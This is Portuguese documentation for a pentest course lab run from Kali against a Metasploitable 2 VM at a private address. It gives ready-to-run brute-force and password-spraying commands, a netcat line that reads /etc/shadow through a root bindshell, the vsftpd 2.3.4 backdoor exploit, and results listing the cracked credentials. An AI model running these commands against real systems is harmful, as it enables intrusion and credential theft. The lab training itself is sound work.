# Ataques — Script e Mapa do Menu

## Script

- Código-fonte: `lab-attacks.sh` (raiz do repositório)
- Exploit auxiliar: `scripts/vsftpd_backdoor.py`
- Cópias no Kali: `/home/kali/lab-attacks.sh` e `/home/kali/vsftpd_backdoor.py`
- Execução (dentro do Kali):

```bash
TARGET=192.168.56.3 ./lab-attacks.sh all
TARGET=192.168.56.3 ./lab-attacks.sh recon hydra medusa vnc db tomcat bindshell backdoor
```

- Módulos: `prep recon smb hydra ncrack john wpscan patator medusa vnc db tomcat bindshell backdoor spray smb-access all`
- Variáveis de ambiente:

| Variável | Padrão | Função |
|---|---|---|
| `TARGET` | `192.168.56.3` | IP do Metasploitable |
| `OUTROOT` | `~/lab-output` | Diretório raiz dos logs |
| `MAX_WORDS` | `1000` | Tamanho do subset do rockyou |
| `WPSCAN_URL` | `http://$TARGET/wordpress/` | URL para o WPScan |
| `ACTIVE` | `0` | `1` habilita upload de marcador via SMB |
| `FORCE` | `0` | `1` permite alvo fora de faixa privada |

- Saída: `~/lab-output/<timestamp>/` com `run.log` e um arquivo por ferramenta
- Proteção: recusa alvos fora de `10/8`, `172.16/12`, `192.168/16` e loopback, salvo `FORCE=1`

## Deploy no Kali

```bash
scp -i ~/.ssh/id_ed25519_big lab-attacks.sh scripts/vsftpd_backdoor.py \
  eskokado@192.168.15.4:/tmp/

ssh -i ~/.ssh/id_ed25519_big eskokado@192.168.15.4 '
  VBoxManage guestcontrol "kali-linux-2026.3-virtualbox-amd64" copyto \
    --username kali --password kali /tmp/lab-attacks.sh /home/kali/lab-attacks.sh
  VBoxManage guestcontrol "kali-linux-2026.3-virtualbox-amd64" copyto \
    --username kali --password kali /tmp/vsftpd_backdoor.py /home/kali/vsftpd_backdoor.py
'
```

## Módulos

| Módulo | O que faz |
|---|---|
| `prep` | Cria `users.txt`, `pass-small.txt`, `creds-stuffing.txt` e subset do rockyou |
| `recon` | `nmap -sV` nas portas relevantes do Metasploitable |
| `smb` | `enum4linux(-ng)` (timeout 120s), shares (`smbclient -L`) e `smbmap` (timeout 60s) |
| `hydra` | FTP, Telnet, credential stuffing (`-C`), SSH (com aviso de MAC) e DVWA |
| `ncrack` | Credencial única em SSH e lista em FTP |
| `john` | Gera hashes MD5-crypt de demonstração e quebra com wordlist |
| `wpscan` | Enumeração de usuários/senhas se houver WordPress |
| `patator` | FTP e SSH via wrapper `fork` (Python 3.14) |
| `medusa` | SSH, FTP e Telnet |
| `vnc` | Hydra contra VNC (somente senha; executa em `/tmp`) |
| `db` | Medusa no PostgreSQL, scripts nmap no MySQL e `mysql --skip-ssl` como root |
| `tomcat` | Hydra `http-get` no `/manager/html` (porta 8180) |
| `bindshell` | Acesso root pela porta 1524, captura do `/etc/shadow` e John |
| `backdoor` | Reinicia o vsftpd via 1524, dispara CVE-2011-2523, captura o `/etc/shadow` e roda John |
| `spray` | Password spraying em SMB (`medusa -M smbnt`) e SSH (`medusa -M ssh`) |
| `smb-access` | Lista `//192.168.56.3/tmp` com `msfadmin`; upload só com `ACTIVE=1` |

## Mapa do menu do curso

| Item do menu | Como é coberto |
|---|---|
| Ambiente com Kali Linux e Metasploitable 2 | Infraestrutura descrita em [ambiente.md](ambiente.md) |
| Alcançando a Máquina Vulnerável no Metasploitable 2 | `recon` (`nmap -sV`) |
| Criando Arquivos de Usuários e Senhas Comuns | `prep` (`users.txt`, `pass-small.txt`) |
| Criação de Wordlists | `prep` (subset do rockyou com `MAX_WORDS`) |
| Hydra no Kali Linux | `hydra` (FTP, Telnet, stuffing, formulário) |
| Ncrack no Kali Linux | `ncrack` (SSH e FTP) |
| John no Kali Linux | `john` (demo) e `bindshell`/`backdoor` (shadow real) |
| WPScan no Kali Linux | `wpscan` (condicional a WordPress) |
| Patator no Kali Linux | `patator` (FTP e SSH) |
| Ataques de Força Bruta em Formulários de Login Web | `hydra` contra `/dvwa/login.php` |
| Utilizando o Medusa para Simular Combinações de Acesso | `medusa` (SSH/FTP/Telnet) + `db` (PostgreSQL) |
| Password Spraying e Credential Stuffing | `hydra -C`, `spray` (SMB/SSH) |
| Ataque em Cadeia: Enumeração SMB e Password Spraying | `smb` e `spray` |
| Simulando um Cenário Corporativo Mal Configurado | `smb` + `smb-access` + `spray` |
| Criando uma Lista de Usuários | `prep` (`users.txt`) |
| Testando o Acesso Utilizando SMBclient | `smb-access` |
| Limitações do Medusa e Dicas Finais | Seção "Limitações por ferramenta" |
| Encerramento | Checklist de evidências |
| Entendendo o Desafio | Relatório final (README) |
| Extras (além do curso) | `vnc`, `db`, `tomcat`, `bindshell` e `backdoor` |

## Comandos manuais principais

```bash
# Reconhecimento
nmap -sV -Pn -T4 -p 21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,3306,5432,5900,6000,6667,8009,8080,8180 192.168.56.3

# Hydra — FTP
hydra -l msfadmin -P pass-small.txt -t 1 -f ftp://192.168.56.3

# Hydra — credential stuffing
hydra -C creds-stuffing.txt -t 1 -f ftp://192.168.56.3

# Hydra — formulário DVWA
hydra -l admin -P pass-small.txt -t 1 -f 192.168.56.3 \
  http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"

# Medusa — SSH e PostgreSQL
medusa -h 192.168.56.3 -u msfadmin -p msfadmin -M ssh -f
medusa -h 192.168.56.3 -u postgres -p postgres -M postgres -f

# Ncrack — SSH
ncrack -vv --user msfadmin --pass msfadmin ssh://192.168.56.3

# Patator — FTP (wrapper fork no Python 3.14)
python3 -c 'import multiprocessing as mp; mp.set_start_method("fork"); from patator.patator import cli; raise SystemExit(cli())' \
  ftp_login host=192.168.56.3 user=msfadmin password=FILE0 0=pass-small.txt \
  -x ignore:fgrep='Login incorrect' -t 1 --max-retries 1

# VNC — Hydra (somente senha)
cd /tmp && hydra -P pass-small.txt -t 1 -f vnc://192.168.56.3

# Tomcat Manager
hydra -l tomcat -p tomcat -s 8180 -t 1 -f 192.168.56.3 http-get /manager/html

# MySQL — root sem senha
nmap -p 3306 --script mysql-empty-password,mysql-info 192.168.56.3
mysql --skip-ssl -h 192.168.56.3 -u root -e 'select version(); show databases;'

# John — hashes de demonstração
john --format=md5crypt --wordlist=pass-small.txt hashes.txt

# Bindshell 1524 (root)
{ echo id; sleep 1; echo 'echo; cat /etc/shadow'; sleep 2; } | timeout 8 nc 192.168.56.3 1524

# Backdoor vsftpd 2.3.4
python3 scripts/vsftpd_backdoor.py 192.168.56.3

# SMB — enumeração e acesso
enum4linux -a 192.168.56.3
smbclient -L //192.168.56.3 -U 'msfadmin%msfadmin'
smbclient //192.168.56.3/tmp -U 'msfadmin%msfadmin' -c 'ls'

# Password spraying — SMB
medusa -h 192.168.56.3 -U users.txt -p msfadmin -M smbnt -t 2 -f
```

## Resultado da execução final

Execução `all` em 2026-11-07, run `20261107-093736` (logs em
[`evidence/20261107-093736/`](../evidence/20261107-093736/)).

| Módulo | Resultado |
|---|---|
| `recon` | 21, 22, 23, 25, 53, 80, 111, 139, 445, 512, 513, 514, 1099, 1524, 2049, 3306, 5432, 5900, 6000, 6667, 8009, 8180 abertas |
| `smb` | Shares listados; `smbmap` interrompido por timeout (forkserver Python 3.14) |
| `hydra` | FTP `msfadmin:msfadmin`; DVWA `admin:password`; SSH com `kex error` (MAC legado) |
| `ncrack` | SSH e FTP `msfadmin:msfadmin` |
| `john` | 3/3 hashes demo: `msfadmin:msfadmin`, `user:password`, `admin:secret` |
| `wpscan` | Pulado: alvo sem WordPress (HTTP 404) |
| `patator` | FTP `msfadmin:msfadmin`; SSH incompatível (hostkey legado) |
| `medusa` | FTP e SSH `msfadmin:msfadmin` |
| `vnc` | Senha `password` |
| `db` | PostgreSQL `postgres:postgres`; MySQL root sem senha |
| `tomcat` | `tomcat:tomcat` no `/manager/html` (8180) |
| `bindshell` | `uid=0(root)`; `/etc/shadow` capturado; 3 hashes quebrados |
| `backdoor` | Backdoor vsftpd abriu root na 6200; `/etc/shadow` + John |
| `spray` | SMB `msfadmin:msfadmin` (`ADMIN$`); SSH `msfadmin:msfadmin` (Medusa) |
| `smb-access` | Listagem de `//192.168.56.3/tmp` OK (somente leitura) |

### Cadeias de pós-exploração

- **Bindshell 1524 → shadow → John:** a porta 1524 entrega um shell root direto.
  O módulo captura o `/etc/shadow` e quebra os hashes MD5-crypt com `pass-small`
  + subset do rockyou (`msfadmin:msfadmin`, `sys:batman`, `klog:123456789`).
- **vsftpd 2.3.4 (CVE-2011-2523) → root → shadow → John:** o módulo reinicia o
  vsftpd pela 1524, envia `USER user:)` e conecta na bindshell 6200, repetindo a
  captura e a quebra do shadow.

## Limitações por ferramenta

- **Hydra SSH**: falha com `kex error` por MAC antigo do servidor; use Medusa/Ncrack
- **Patator SSH**: paramiko rejeita hostkey legado; use Medusa/Ncrack
- **Patator**: exige wrapper `fork` no Python 3.14 (já embutido no script)
- **smbmap**: trava com forkserver do Python 3.14; execução limitada por `timeout 60`
- **WPScan**: sem WordPress no Metasploitable; use `WPSCAN_URL`
- **Hydra VNC**: não aceita usuário; apenas `-P`/`-p`
- **vsftpd backdoor**: requer serviço recém-reiniciado; o script reinicia via 1524
- **MySQL antigo**: cliente atual exige `--skip-ssl`
- **rockyou**: apenas subset (`MAX_WORDS`), para execução rápida
- **SMB**: upload somente com `ACTIVE=1`; padrão é somente leitura

## Checklist de evidências do desafio

- [x] Print do `nmap` com as portas abertas — [kali-nmap.png](../images/kali-nmap.png)
- [x] Print do Medusa/Hydra com credencial encontrada — [kali-resumo-ataques.png](../images/kali-resumo-ataques.png)
- [x] Print do Ncrack — logs em `evidence/20261107-093736/ncrack-*.txt`
- [x] Print do John com hashes quebrados — logs `john.txt` e `john-shadow.txt`
- [x] Print do Patator (FTP) — log `patator-ftp.txt`
- [x] Print do formulário DVWA (Hydra `admin:password`) — log `hydra-dvwa.txt`
- [x] Print do `enum4linux` e `smbclient` — logs `enum4linux.txt` e `smb-*.txt`
- [x] Print do password spraying (SMB) — log `spray-smb-msfadmin.txt`
- [x] `run.log` da execução final arquivado — [run.log](../evidence/20261107-093736/run.log)
- [x] Extras: VNC, PostgreSQL, MySQL, Tomcat, bindshell e vsftpd backdoor — logs correspondentes
